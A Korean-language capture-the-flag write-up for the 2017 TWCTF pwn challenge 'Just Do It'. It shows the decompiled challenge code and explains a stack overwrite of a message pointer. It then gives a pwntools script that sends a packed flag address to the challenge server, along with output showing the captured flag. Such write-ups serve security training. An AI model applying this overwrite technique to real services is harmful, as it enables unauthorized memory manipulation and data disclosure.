# 2017 TWCTF - [PWN] Just Do It

## Key words

- 32bit ELF
- overwrite local variable

## Solution

문제를 보면 다음과 같습니다.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+8h] [bp-20h]@7
  FILE *flag; // [sp+18h] [bp-10h]@1
  char *v6; // [sp+1Ch] [bp-Ch]@1

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  v6 = failed_message;
  flag = fopen("flag.txt", "r");
  if ( !flag )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(::flag, 48, flag) )
  {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  if ( !fgets(&s, 32, stdin) )
  {
    perror("input error.\n");
    exit(0);
  }
  if ( !strcmp(&s, PASSWORD) )
    v6 = success_message;
  puts(v6);
  return 0;
}
```

전역 변수 `::flag`에 플래그 파일을 읽어 저장하고 사용자의 입력을 받아 전역 변수 `PASSWORD`과 같은지 비교 합니다. 마지막으로 v6을 통해 성공 메시지를 출력할 것인지 실패 메시지를 출력할 것인지를 결정합니다.

가장 먼저 보이는 버그는 입력받는 s의 버퍼로 v6 변수 까지 덮을 수 있는 점 입니다. 따라서, v6의 값을 전역 변수의 주소로 변경하면 마지막에 puts 를 하게 되면서 플래그를 출력하게 됩니다.

## Solution Code

```python
from pwn import *

server = "pwn1.chal.ctf.westerns.tokyo"
port = 12345

r = remote(server, port)

print r.recv()

p = 0x0804a080

r.sendline(p32(p) * 8)

data = r.recv()

print data
print data.encode("hex")

r.interactive()
```

## Result

```
tbkim@ubuntu:~/ctfing/2017_mma/pwn/just$ python sol_just.py
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12345: Done
Welcome my secret service. Do you know the password?
Input the password.

TWCTF{pwnable_warmup_I_did_it!}
```